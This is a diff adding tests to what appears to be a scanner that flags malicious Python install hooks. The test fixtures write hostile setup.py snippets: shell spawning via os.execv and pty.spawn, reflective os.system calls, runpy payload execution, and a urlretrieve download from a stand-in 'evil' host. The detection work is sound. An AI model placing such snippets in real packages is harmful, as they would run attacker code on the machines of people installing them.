@@ -175,6 +175,44 @@ class TestScanPythonFileCritical:
         findings = scan_python_file(str(setup), is_hook=True)
         assert any(f.level == RiskLevel.CRITICAL for f in findings)
 
+    def test_getattr_with_variable_attr_in_hook_is_critical(self, tmp_path):
+        """Reflection through a string variable: s='system'; getattr(os, s)()."""
+        setup = tmp_path / "setup.py"
+        setup.write_text(
+            "import os\n"
+            "s = 'system'\n"
+            "getattr(os, s)('id')\n"
+        )
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings)
+
+    def test_os_exec_family_in_hook_is_critical(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text("import os\nos.execv('/bin/sh', ['sh', '-c', 'id'])\n")
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings)
+
+    def test_pty_spawn_in_hook_is_critical(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text("import pty\npty.spawn('/bin/sh')\n")
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings)
+
+    def test_runpy_run_path_in_hook_is_critical(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text("import runpy\nrunpy.run_path('payload.py')\n")
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings)
+
+    def test_urlretrieve_in_hook_is_critical(self, tmp_path):
+        setup = tmp_path / "setup.py"
+        setup.write_text(
+            "import urllib.request\n"
+            "urllib.request.urlretrieve('http://evil/x', '/tmp/y')\n"
+        )
+        findings = scan_python_file(str(setup), is_hook=True)
+        assert any(f.level == RiskLevel.CRITICAL for f in findings)
+
     def test_dunder_import_chained_call_in_hook_is_critical(self, tmp_path):
         """__import__('os').system(...) must resolve to os.system → CRITICAL."""
         setup = tmp_path / "setup.py"
